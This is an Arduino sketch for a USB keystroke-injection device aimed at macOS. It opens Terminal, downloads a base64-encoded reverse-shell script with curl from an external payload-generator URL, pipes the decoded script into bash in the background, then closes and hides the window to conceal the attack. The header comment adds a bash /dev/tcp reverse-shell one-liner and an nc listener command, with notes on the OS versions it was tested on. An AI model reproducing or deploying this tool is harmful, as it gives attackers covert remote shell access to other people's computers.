/*

Ghostshell Reverse-Shell
www.ghostshell.de

Target: OSX


open terminal
curl download shell-script and execute it

https://github.com/arduino-libraries/Keyboard


CLI-Command:
bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"

Listener:
nc -lnvp 8888

Sample command:
open -a Calculator


Tested on:
OSX 10.15.7 and 12.4 - without mod works with US and DE Layout both

CHANGE TARGET IN URL LINE 56 !!!!! ip=YOURIP -d port=YOURPORT
 
*/



#include "Keyboard.h"
#include "Keyboard_de_DE.h"


void setup() {
Keyboard.begin();
delay(5000);

// PRESS CMD + SPACE     
Keyboard.press(KEY_LEFT_GUI);
delay(1000);
Keyboard.press(' ');
Keyboard.releaseAll();
delay(300);

// START TERMINAL
Keyboard.println("terminal");
delay(500);
Keyboard.press(KEY_RETURN);
delay(300);

// DOWNLOAD SHELL-SCRIPT
Keyboard.println("curl -X GET -G https://ghostshell.de/payloads/gen_payload.php -d ip=wslab.de -d port=6666 -d os=osx -d enc=base64 -o shell.sh\n");

delay(1000);

Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
//delay(60000);


// EXECUTE SHELL-SCRIPT
delay(500);
//Keyboard.println("bash shell.sh &\n");
Keyboard.println("base64 -D -in shell.sh | bash &\n");
Keyboard.press(KEY_RETURN);

// HIDE SHELL
//delay(2000);
Keyboard.println("exit\n");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(500);
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('h');
Keyboard.releaseAll();

// RELEASE ALL AND WAIT 1h
Keyboard.releaseAll();
delay(60000);

}
void loop() {

}
